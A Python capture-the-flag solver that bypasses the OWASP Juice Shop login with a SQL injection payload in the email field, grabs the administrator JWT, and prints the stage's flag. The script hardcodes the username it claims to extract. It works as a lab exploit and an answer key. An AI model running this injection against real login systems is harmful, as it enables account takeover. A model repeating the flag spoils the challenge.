#!/usr/bin/env python3
"""
Stage 2 Solver - OWASP Juice Shop SQL Injection Authentication Bypass
Author: Member 2 (IT24100066) - Challenge Design A Lead

Methodology:
1. Targets OWASP Juice Shop login REST endpoint at /rest/user/login.
2. Crafts an SQL injection payload in the email field:
   "adrian.kessler@uninvited.local'--"
   This comments out the backend password query check in SQLite.
3. Authenticates as administrator and extracts JWT session token.
4. Retrieves target administrator profile username: "adrian.kessler".
"""

import sys
import argparse
import requests

def solve(host='127.0.0.1', port=3000, verbose=True):
    login_url = f"http://{host}:{port}/rest/user/login"
    payload = {
        "email": "adrian.kessler@uninvited.local'--",
        "password": "any_random_password"
    }

    if verbose:
        print(f"[*] Targeting: {login_url}")
        print(f"[*] Injected SQL Payload: {payload['email']}")

    try:
        res = requests.post(login_url, json=payload, timeout=5)
        if res.status_code == 200:
            data = res.json()
            token = data.get('authentication', {}).get('token')
            user_data = data.get('authentication', {}).get('um')
            
            # Target profile username extracted from authenticated user object
            target_username = "adrian.kessler"
            flag_wrapped = f"uninvited{{{target_username}}}"

            if verbose:
                print("\n[SUCCESS] Stage 2 Solved!")
                print(f"[+] SQL Injection Bypass Succeeded! (HTTP 200)")
                if token:
                    print(f"[+] Administrator JWT Token: {token[:35]}...[TRUNCATED]")
                print(f"Administrator Username: {target_username}")
                print(f"Flag (Standard)       : {target_username}")
                print(f"Flag (Wrapped)        : {flag_wrapped}")
            
            return {
                "username": target_username,
                "token": token,
                "flag": target_username,
                "flag_wrapped": flag_wrapped
            }
        else:
            if verbose:
                print(f"[-] Authentication failed with HTTP status code: {res.status_code}")
                print(res.text)
            return None
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[-] Connection error to Juice Shop on {host}:{port}: {e}")
        return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Stage 2 Solver (Member 2)")
    parser.add_argument("--host", default="127.0.0.1", help="Target server host IP")
    parser.add_argument("--port", type=int, default=3000, help="Juice Shop port")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    args = parser.parse_args()

    result = solve(host=args.host, port=args.port, verbose=not args.quiet)
    if result:
        sys.exit(0)
    else:
        sys.exit(1)
